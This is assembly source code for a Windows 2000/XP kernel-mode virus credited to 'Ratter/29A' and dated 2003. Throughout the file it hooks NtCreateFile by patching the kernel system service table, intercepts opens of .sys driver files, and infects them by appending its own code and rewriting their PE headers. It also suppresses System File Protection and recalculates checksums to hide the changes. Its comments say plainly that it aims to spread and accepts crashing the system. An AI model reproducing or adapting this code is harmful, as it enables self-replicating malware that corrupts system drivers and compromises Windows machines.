
.586p
.model flat, stdcall

	include		ntstatus.inc
	include		my_macroz.inc
	include		useful.inc
	include		win32api.inc

.data

.data?
	align 4

.code init

driver_entry	proc near
        local	delta_offset:DWORD
	local	IoFreeMdl:DWORD
	local	MmUnlockPages:DWORD
	local	MmUnmapLockedPages:DWORD
	local	MmMapLockedPages:DWORD
	local	MmProbeAndLockPages:DWORD
        local	MmCreateMdl:DWORD
	local	ObDereferenceObject:DWORD
	local	ObQueryNameString:DWORD
	local	ObReferenceObjectByHandle:DWORD
        local	NtFreeVirtualMemory:DWORD
	local	NtAllocateVirtualMemory:DWORD
        local	ZwCreateFile:DWORD
        local	KeUserModeCallback:DWORD
        local	KeServiceDescriptorTable:DWORD
        local	ExFreePool:DWORD
        local	ExAllocatePool:DWORD
        local	KeNumberProcessors:DWORD

        pushad

	call delta
delta:
	pop eax
	sub eax, offset delta-offset driver_entry
        sub eax, 0280h
new_eip	equ	$-4
	xchg eax, ebx

        @gimme_delta
        mov dword ptr [delta_offset], eax
        mov dword ptr [eax+mod_base], ebx

        mov ebx, 80400000h
        cmp word ptr [ebx], "ZM"
        jz driver_imagebase_found

        mov ebx, 804D0000h
        cmp word ptr [ebx], "ZM"
        jnz jmp_to_host

driver_imagebase_found:
	call $+5+(17*4)
api_crcz	equ	$
	dd	08dfe8d1bh			; KeNumberProcessors
	dd	09941111fh			; ExAllocatePool
	dd	0764980b2h			; ExFreePool
	dd	07e931efeh			; KeServiceDescriptorTable
	dd	055418fc0h			; KeUserModeCallback
	dd	0534a4a45h			; ZwCreateFile
	dd	017cdbfd2h			; NtAllocateVirtualMemory
	dd	011ef7650h			; NtFreeVirtualMemory
	dd	0bd92e2f9h			; ObReferenceObjectByHandle
	dd	06bee4f9fh			; ObQueryNameString
	dd	019719207h			; ObDereferenceObject
	dd	0b829a558h			; MmCreateMdl
	dd	0f64a2079h                      ; MmProbeAndLockPages
	dd	0acd9bf9fh                      ; MmMapLockedPages
	dd	068dd58f4h                      ; MmUnmapLockedPages
	dd	03e222dfah                      ; MmUnlockPages
	dd	0751d76e7h                      ; IoFreeMdl
api_count	equ	($-api_crcz)/4
        pop esi
	push api_count
        lea edi, [KeNumberProcessors]
	pop ecx

	call gimme_apiz
	jz jmp_to_host

	mov eax, dword ptr [KeNumberProcessors]
	cmp dword ptr [eax], 1
	jnz jmp_to_host

	mov edx, "rata"
	mov eax, dword ptr [ebx+1ch]
	cmp eax, edx
	jz jmp_to_host

        cmpxchg dword ptr [ebx+1ch], edx
	jnz jmp_to_host

	push che_end-driver_entry
        push 0
	call ExAllocatePool
	test eax, eax
	jz jmp_to_host

	xchg eax, edi

	lea esi, [driver_entry]
	push edi
	add esi, dword ptr [delta_offset]

	push che_end-driver_entry
	pop ecx
	rep movsb
	pop esi

	mov eax, dword ptr [KeUserModeCallback]
	mov dword ptr [esi+(ke_user_mode_callback-driver_entry)], eax

        mov eax, dword ptr [NtAllocateVirtualMemory]
	mov dword ptr [esi+(allocate_virtual_memory-driver_entry)], eax

        mov eax, dword ptr [NtFreeVirtualMemory]
	mov dword ptr [esi+(free_virtual_memory-driver_entry)], eax

        mov eax, dword ptr [ObReferenceObjectByHandle]
	mov dword ptr [esi+(reference_object_by_handle-driver_entry)], eax

        mov eax, dword ptr [ObQueryNameString]
	mov dword ptr [esi+(query_name_string-driver_entry)], eax

	mov eax, dword ptr [ObDereferenceObject]
	mov dword ptr [esi+(dereference_object-driver_entry)], eax

        mov eax, dword ptr [ZwCreateFile]
        mov ecx, dword ptr [eax+1]

	mov edi, dword ptr [KeServiceDescriptorTable]
	mov edi, dword ptr [edi]

        push 4
        lea eax, [edi+ecx*4]
        push eax
        push 0
	call MmCreateMdl
	test eax, eax
	jz jmp_to_host_
	xchg eax, ebx

	; this has to work, otherwise don't care about the BSOD
	; we want to spread, not to be kind

	push 2
	push 0
	push ebx
	call MmProbeAndLockPages

	push 0
	push ebx
	call MmMapLockedPages
	xchg eax, edi
	;

        lea edx, [esi+(new_ntcreatefile-driver_entry)]
        mov eax, [edi]
	mov dword ptr [esi+(old_ntcreatefile-driver_entry)], eax

	cmpxchg dword ptr [edi], edx
	pushfd

	push ebx
	push edi
	call MmUnmapLockedPages

	push ebx
	call MmUnlockPages

	push ebx
	call IoFreeMdl

	popfd
	jz jmp_to_host

jmp_to_host_:
        push esi
	call ExFreePool
jmp_to_host:
	popad
	mov eax, 260h
host_start_addr	equ	$-4
	add eax, 12345678h
mod_base	equ	$-4

	leave
	jmp eax
driver_entry	endp

gimme_apiz	proc	near
        push dword ptr [esi]
	call gimme_api
	test eax, eax
	jz gimme_apiz_end
	stosd
	add esi, 4
	loop gimme_apiz
gimme_apiz_end:
	retn
gimme_apiz	endp

; in: [esp+4] - api CRC32
;     ebx - dll base
; out: eax - api address or null if error
gimme_api	proc	near
        xor eax, eax
        pushad
	mov eax, dword ptr [ebx+3ch]
	add eax, ebx
	mov ecx, dword ptr [eax+78h]
	jecxz gimme_api_end

        xchg ecx, edx
	add edx, ebx

	push edx
	push dword ptr [edx+18h]

	mov edi, dword ptr [edx+20h]
	add edi, ebx
	xor ecx, ecx

gimme_api_next_api:
	mov esi, dword ptr [edi+ecx*4]
	add esi, ebx
	push 0
	call gimme_CRC32

	cmp eax, dword ptr [esp+cPushad+12]
	jnz gimme_api_go_on

	mov edx, dword ptr [esp+4]
	mov eax, dword ptr [edx+24h]
	add eax, ebx

	push ecx
	movzx ecx, word ptr [eax+ecx*2]

	mov eax, dword ptr [edx+1ch]
	add eax, ebx

	mov eax, dword ptr [eax+ecx*4]
	pop ecx

	add eax, ebx

	mov dword ptr [esp+8+Pushad_eax], eax
	jmp gimme_api_end

gimme_api_go_on:
	inc ecx
	cmp ecx, dword ptr [esp]
	jc gimme_api_next_api

gimme_api_end:
	add esp, 8
	popad
	retn 4
gimme_api	endp

gimme_CRC32	proc	near
	pushad
	xor edx, edx
	mov eax, edx
gimme_CRC32_all_iz_ok:
	mov ecx, dword ptr [esp+cPushad+4]
	jecxz gimme_CRC32_asciiz_string
gimme_CRC32_main_loop:
	lodsb
	cmp al, 'a'
	jc gimme_CRC32_big
	cmp al, 'z'
	ja gimme_CRC32_big
	add al, 'A'-'a'
gimme_CRC32_big:
	xor ah, al
	rol eax, 8
	xor eax, edx
	not edx
	mov bl, 32
gimme_CRC32_next:
	rol eax, 1
	xor edx, 05f6abcd8h
	xor eax, 0a6dfe9ffh
	ror edx, 1
	add eax, edx
	xor edx, 08ad6fe7h
	dec bl
	jnz gimme_CRC32_next
	xor eax, edx
	dec ecx
	jnz gimme_CRC32_main_loop
	mov dword ptr [esp+Pushad_eax], eax
	popad
	retn 4
gimme_CRC32_asciiz_string:
	mov edi, esi
	push esi
	inc edi
	@endsz
	sub esi, edi
	mov dword ptr [esp+cPushad+8], esi
	pop esi
	jmp gimme_CRC32_all_iz_ok
gimme_CRC32	endp

; out: eax - *peb
is_user_mode_thread	proc	near
	assume fs:nothing
	push ebx
	mov ebx, dword ptr fs:[124h]
	mov eax, dword ptr [ebx+134h]		; gimme KTRAP_FRAME
						; no ktrap_frame if called from kernel mode
						; (from non user mode thread)
	test eax, eax
	jz is_user_mode_thread_end

	mov eax, dword ptr [ebx+44h]
        mov eax, dword ptr [eax+1b0h]		; peb for non user mode threadz null too
        test eax, eax
is_user_mode_thread_end:
	pop ebx
        retn	
is_user_mode_thread	endp

        @textw kernel32, <kernel32.dll>

new_ntcreatefile	proc	near
	pushad

	@gimme_delta
	xchg eax, esi

	test dword ptr [esi+_lock_], 1
	jnz new_ntcreatefile_end
	bts dword ptr [esi+_lock_], 0
	jc new_ntcreatefile_end

	; locked

	mov eax, dword ptr [esp+cPushad+4+8]
	mov edx, dword ptr [eax+8]
	movzx ecx, word ptr [edx]
	test ecx, ecx
 	jz new_ntcreatefile_end_unlock

	shr ecx, 1

	mov edx, dword ptr [edx+4]
	test edx, edx
	jz new_ntcreatefile_end_unlock

	push esi
	mov esi, edx
	xor edx, edx

	; edx - filename to open (relative to roothandle)
	; does it end with .sys ?

	shl edx, 8
	lodsw
	or dl, al
	loop $-7
	pop esi

	cmp edx, ".sys"				;".sys"	
						; for debug purposes only
	jnz new_ntcreatefile_end_unlock

	; yep we've got a file to infect :)

	call is_user_mode_thread
	jz new_ntcreatefile_end_unlock

        ; in eax - *peb

        lea edi, [esi+kernel32]
        push esi
        mov eax, dword ptr [eax+0ch]
        test eax, eax
        jz new_ntcreatefile_next

        mov esi, dword ptr [eax+1ch]
	lodsd
        mov esi, dword ptr [eax+20h]
        mov ebx, dword ptr [eax+08h]

        push (kernel32_size/2)-1
        pop ecx
        repz cmpsw
        pop esi
        jnz new_ntcreatefile_end_unlock

        lea edi, [esi+createfilew]
        push esi
	call $+5+(11*4)
kapi_crcz	equ	$
	dd	0ca098632h			; CreateFileW
	dd	025a15565h			; CloseHandle
	dd	055cf7e74h			; LoadLibrary
	dd	0a6f95bd8h			; GetProcAddress
	dd	0de584a52h			; FreeLibrary
	dd	04e5e945dh			; GetFileAttributes
	dd	03af9dc9dh			; SetFileAttributes
	dd	09978b3c4h			; CreateFileMapping
	dd	09d7bdf4fh			; MapViewOfFile
	dd	07eb373dbh			; UnmapViewOfFile
	dd	0abf152edh			; GetFileSize
kapi_count	equ	($-kapi_crcz)/4
        pop esi
	push kapi_count
	pop ecx
	call gimme_apiz
new_ntcreatefile_next:
	pop esi
	jz new_ntcreatefile_end_unlock

	call is_user_mode_thread

new_ntcreatefile_try_to_infect:
	; in eax - *peb

	mov eax, dword ptr [eax+2ch]		; *KernelCallbackTable
	mov dword ptr [esi+kernel_callback_table], eax

	push ebp
	mov ebp, esp
	add esp, -24

	pobject		equ	ebp-4
	bytes_returned	equ	ebp-8
	base_address	equ	ebp-12
	allocation_size	equ	ebp-16
	ecx_on_return	equ	ebp-20
	edx_on_return	equ	ebp-24

	and dword ptr [base_address], 0

	push PAGE_READWRITE
	push MEM_COMMIT or MEM_TOP_DOWN or MEM_RESERVE
	lea eax, [allocation_size]
	mov dword ptr [allocation_size], (((1028+che_end-driver_entry)/4096)+1)* 4096
	push eax        
	lea eax, [base_address]
	push 0
	push eax
	push -1
	mov eax, 12345678h
allocate_virtual_memory	equ	$-4
        call eax
	test eax, eax
        jnz new_ntcreatefile_infect_end

        mov edx, dword ptr [base_address]
        lea eax, [edx+1028+(infect_routine-driver_entry)]
        mov dword ptr [edx], eax

        lea edi, [edx+1024+4]
        push esi
        lea esi, [esi+driver_entry]		; copy the to user-mode
        push che_end-driver_entry
        pop ecx
        rep movsb
        pop esi

        lea edi, [edx+12]
        mov ebx, 1016

	xor edx, edx
	mov eax, dword ptr [ebp+4+cPushad+4+8]
	mov ecx, dword ptr [eax+4]
	jecxz new_createfile_infect_no_roothandle

	sub edi, 8
	add ebx, 8

	lea eax, [pobject]
        push edx
	push eax
	push edx
	push edx
	push edx
	push ecx				; roothandle
	mov eax, 12345678h
reference_object_by_handle	equ	$-4
	call eax
	test eax, eax
	jnz new_ntcreatefile_infect_end_free_mem

        lea eax, [bytes_returned]
	push eax
	push ebx
	push edi				; allocated mem in the process
	push dword ptr [pobject]
	mov eax, 12345678h
query_name_string	equ	$-4
	call eax

	push eax

	push dword ptr [pobject]
	mov eax, 12345678h
dereference_object	equ	$-4
	call eax

	pop eax

	test eax, eax
	jnz new_ntcreatefile_infect_end_free_mem

	movzx ecx, word ptr [edi]
	lea edi, [edi+ecx+8]
	sub ebx, ecx
	sub ebx, 2
	jl new_ntcreatefile_infect_end_free_mem

	xor eax, eax
	mov al, '\'
	stosw

new_createfile_infect_no_roothandle:
	; now copy the normal name to the buffer

	mov eax, dword ptr [ebp+4+cPushad+4+8]
	mov edx, dword ptr [eax+8]
	movzx ecx, word ptr [edx]

	sub ebx, ecx
	jle new_ntcreatefile_infect_end_free_mem

	shr ecx, 1

        push esi
	mov esi, dword ptr [edx+4]
	rep movsw
	pop esi

        mov eax, 12345678h
kernel_callback_table	equ	$-4
	mov edx, [base_address]
	sub edx, eax
	shr edx, 2

	lea ecx, [ecx_on_return]
	push ecx
	lea eax, [edx_on_return]
	push eax
	push 0
	lea eax, [edx_on_return]
	push eax			; stack start
	push edx
        mov eax, 12345678h
ke_user_mode_callback	equ	$-4
	call eax

new_ntcreatefile_infect_end_free_mem:
	push MEM_DECOMMIT
	lea eax, [allocation_size]
	push eax
	lea eax, [base_address]
	push eax
        push -1
	mov eax, 12345678h
free_virtual_memory	equ	$-4
	call eax
new_ntcreatefile_infect_end:
        leave

	; locked

new_ntcreatefile_end_unlock:
        btr dword ptr [esi+_lock_], 0
new_ntcreatefile_end:
        popad
        mov eax, 12345678h
old_ntcreatefile	equ	$-4
	jmp eax

_lock_		dd	0
new_ntcreatefile	endp

; infection routine based on Billy Belcebu Aztec virus
; well the code is not very nice, but it worx fine and i have
; better things to do than coding infection routines :)
infect_routine	proc	near
	local	file_name:DWORD
	local	file_attribz:DWORD
	local	file_handle:DWORD
	local	file_size:DWORD
	local	file_size_high:DWORD
	local	mapping_handle:DWORD
	local	map_address:DWORD
	local	new_file_size:DWORD

        pushad
	@SEH_SetupFrame <jmp infect_routine_end>

	@gimme_delta
	xchg eax, esi

	and dword ptr [esi+_lock_], 0

	lea edx, [esi+driver_entry-1024+8]
	cmp dword ptr [edx], 003f005ch
	jnz infect_routine_end
        cmp dword ptr [edx+4], 005c003fh
	jnz infect_routine_end

	add edx, 8
	mov dword ptr [file_name], edx

	push edx
	push edx
	call dword ptr [esi+getfileattributes]
	mov dword ptr [file_attribz], eax

	pop edx
	call sfp_exception

	push 80h
	push edx
	call dword ptr [esi+setfileattributes]

	call open_file
        inc eax
        jz infect_routine_end_restore_attribz
	dec eax

	mov dword ptr [file_handle], eax

	lea edx, [file_size_high]
	push edx
	push eax
	call dword ptr [esi+getfilesize]
	mov dword ptr [file_size], eax

	cmp dword ptr [file_size_high], 0
	jnz infect_routine_end_closehandle

	xchg eax, ecx
	push ecx
	call create_mapping
	pop ecx
	test eax, eax
	jz infect_routine_end_closehandle

	mov dword ptr [mapping_handle], eax

	call map_file
	test eax, eax
	jz infect_routine_end_close_mapping
	mov dword ptr [map_address], eax

	cmp word ptr [eax], "ZM"
	jnz infect_routine_end_unmap_file

        mov ebx, dword ptr [eax+3ch]
        add ebx, eax

        cmp dword ptr [ebx], "EP"
        jnz infect_routine_end_unmap_file

        cmp dword ptr [ebx+4ch], "rata"
        jz infect_routine_end_unmap_file

        push dword ptr [ebx+3ch]

	push eax
        call dword ptr [esi+unmapviewoffile]

        push dword ptr [mapping_handle]
        call dword ptr [esi+closehandle]
	pop ecx

	mov eax, dword ptr [file_size]
	add eax, che_end-driver_entry
	call _align_
	xchg eax, ecx
	mov dword ptr [new_file_size], ecx

	push ecx
	call create_mapping
	pop ecx
	test eax, eax
	jz infect_routine_end_closehandle

	mov dword ptr [mapping_handle], eax

	call map_file
	test eax, eax
	jz infect_routine_end_close_mapping

	mov dword ptr [map_address], eax

	mov ebx, dword ptr [eax+3ch]
	add ebx, eax

	mov edi, ebx

	movzx eax, word ptr [edi+06h]
	dec eax
	imul eax, eax, 28h
	add ebx, eax
	add ebx, 78h
	mov edx, dword ptr [edi+74h]
	shl edx, 3
	add ebx, edx

	mov eax, dword ptr [edi+28h]
	mov dword ptr [esi+host_start_addr], eax

	mov edx, dword ptr [ebx+10h]
	mov eax, edx
	add edx, dword ptr [ebx+14h]

	push edx

	add eax, dword ptr [ebx+0ch]

	mov dword ptr [edi+28h], eax
	mov dword ptr [esi+new_eip], eax

	mov eax, dword ptr [ebx+10h]
	add eax, che_end-driver_entry
	mov ecx, dword ptr [edi+3ch]
        call _align_

	mov dword ptr [ebx+10h], eax
	mov dword ptr [ebx+08h], eax

	add eax, dword ptr [ebx+0ch]
	mov dword ptr [edi+50h], eax
	or dword ptr [ebx+24h], 0A0000020h

	mov dword ptr [edi+4ch], "rata"

	pop edi
	add edi, dword ptr [map_address]

	push esi
	lea esi, [esi+driver_entry]
	mov ecx, che_end-driver_entry
	rep movsb

	pop esi

	call count_correct_checksum

infect_routine_end_unmap_file:
	push dword ptr [map_address]
	call dword ptr [esi+unmapviewoffile]
infect_routine_end_close_mapping:
	push dword ptr [mapping_handle]
	call dword ptr [esi+closehandle]
infect_routine_end_closehandle:
	push dword ptr [file_handle]
	call dword ptr [esi+closehandle]
infect_routine_end_restore_attribz:
        push dword ptr [file_attribz]
        push dword ptr [file_name]
	call dword ptr [esi+setfileattributes]
infect_routine_end:
	@SEH_RemoveFrame
	popad
	leave
	retn

open_file:
	xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING
	push eax
	push eax
	push GENERIC_READ or GENERIC_WRITE
	push dword ptr [file_name]
        call dword ptr [esi+createfilew]
        retn

create_mapping:
        xor eax, eax
        push eax
        push ecx
        push eax
        push PAGE_READWRITE
        push eax
        push dword ptr [file_handle]
        call dword ptr [esi+createfilemapping]
        retn

map_file:
        xor eax, eax
        push ecx
        push eax
        push eax
        push FILE_MAP_READ or FILE_MAP_WRITE
        push dword ptr [mapping_handle]
        call dword ptr [esi+mapviewoffile]
	retn

_align_:
	push edx
	xor edx, edx
        push eax
        div ecx
        pop eax
        sub ecx, edx
        add eax, ecx
        pop edx
        retn

count_correct_checksum:
        pushad
        @pushsz "imagehlp.dll"
        call dword ptr [esi+loadlibrary]
        test eax, eax
        jz count_correct_checksum_end

        xchg eax, ebx

        push 0cf6736bbh
        call gimme_api
        test eax, eax
        jz count_correct_checksum_end
        xchg eax, edi

        mov edx, dword ptr [map_address]

	mov eax, dword ptr [edx+3ch]
	add eax, edx
        lea eax, [eax+58h]

	push eax
	@pushvar <dd	?>
	push dword ptr [new_file_size]
	push edx
	call edi

	push ebx
	call dword ptr [esi+freelibrary]
count_correct_checksum_end:
	popad
	retn

sfp_exception:
        pushad
        mov edi, edx

	@pushsz "sfc_os.dll"
	call dword ptr [esi+loadlibrary]
	test eax, eax
	jz sfp_exception_end

	xchg eax, ebx

        push 5
        push ebx
	call dword ptr [esi+getprocaddress]
	test eax, eax
	jz sfp_exception_end_free_library

        push -1
        push edi
        push 0
	call eax

sfp_exception_end_free_library:
	push ebx
	call dword ptr [esi+freelibrary]
sfp_exception_end:
	popad
	retn

createfilew		dd	?
closehandle		dd	?
loadlibrary		dd	?
getprocaddress		dd	?
freelibrary		dd	?
getfileattributes	dd	?
setfileattributes	dd	?
createfilemapping	dd	?
mapviewoffile		dd	?
unmapviewoffile		dd	?
getfilesize		dd	?
infect_routine	endp

	db	0, "  Win2k||XP.Che by Ratter/29A  ", 0
	db	0, "_-=Dedicated to Trent Reznor=-_", 0
	db	0, "    In Czech Republic, 2003    ", 0

che_end		equ	$

.code
host_start:
	mov eax, STATUS_DRIVER_INTERNAL_ERROR
	retn 8

end	driver_entry
